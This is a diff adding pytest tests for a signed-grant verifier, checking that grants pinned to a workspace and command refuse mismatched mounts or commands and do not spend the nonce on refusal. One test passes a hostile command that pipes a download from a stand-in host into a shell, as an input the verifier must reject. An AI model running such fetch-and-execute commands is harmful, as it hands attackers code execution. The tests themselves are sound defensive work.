@@ -72,6 +72,43 @@ def test_cross_issuer_nonce_isolated():
     assert verify_grant(pkA, _grant(skA, 990, 1100, nonce="shared"), now=1000, nonce_cache=cache) == (False, "replay")
 
 
+def test_workspace_argv_binding_when_pinned():
+    """A grant that PINS workspace/argv authorizes ONLY that mount + command: exod passes the REQUEST's
+    workspace/argv as the expectation, and a stray request (a different rw mount, or a different command)
+    refuses. This is what stops a stolen/relayed grant from being re-pointed at workspace='/' or argv=/bin/sh."""
+    sk, pk = _kp()
+    ws, argv = "/run/ws-abc", ["bash", "/run/ws-abc/run.sh", "--step", "1"]
+    env = mint_grant(sk, run_id="r", plan_sha="p", nbf=990, exp=1100, nonce="n", workspace=ws, argv=argv)
+    assert verify_grant(pk, env, now=1000, expect_workspace=ws, expect_argv=argv)[0] is True   # exact match
+    assert verify_grant(pk, env, now=1000, expect_workspace="/",                                # whole-host mount
+                        expect_argv=argv) == (False, "wrong_workspace")
+    assert verify_grant(pk, env, now=1000, expect_workspace=ws,                                 # injected command
+                        expect_argv=["/bin/sh", "-c", "curl evil|sh"]) == (False, "wrong_argv")
+
+
+def test_workspace_argv_binding_inert_when_unpinned():
+    """A legacy grant that does NOT pin workspace/argv stays byte-identical (fields emitted only when set) and
+    the request expectation is INERT for it — the binding only ever narrows, never forces a legacy grant to
+    carry the fields."""
+    sk, pk = _kp()
+    legacy = _grant(sk, 990, 1100)
+    body = json.loads(base64.b64decode(legacy["payload"]))
+    assert "workspace" not in body and "argv" not in body
+    assert verify_grant(pk, legacy, now=1000, expect_workspace="/anything",
+                        expect_argv=["bash", "x"])[0] is True
+
+
+def test_workspace_mismatch_does_not_spend_nonce():
+    """A workspace/argv mismatch refuses BEFORE the nonce is spent (same ordering as wrong_run/wrong_plan), so
+    a refused request never burns a still-valid grant."""
+    sk, pk = _kp()
+    ws = "/run/ws"
+    cache = NonceCache()
+    env = mint_grant(sk, run_id="r", plan_sha="p", nbf=990, exp=1100, nonce="n7", workspace=ws)
+    assert verify_grant(pk, env, now=1000, expect_workspace="/", nonce_cache=cache) == (False, "wrong_workspace")
+    assert verify_grant(pk, env, now=1000, expect_workspace=ws, nonce_cache=cache)[0] is True
+
+
 def test_malformed_nonce_refused_not_crashed():
     """A None / non-string nonce gives no replay protection -> refuse cleanly, never crash (audit #2/#3)."""
     import pytest
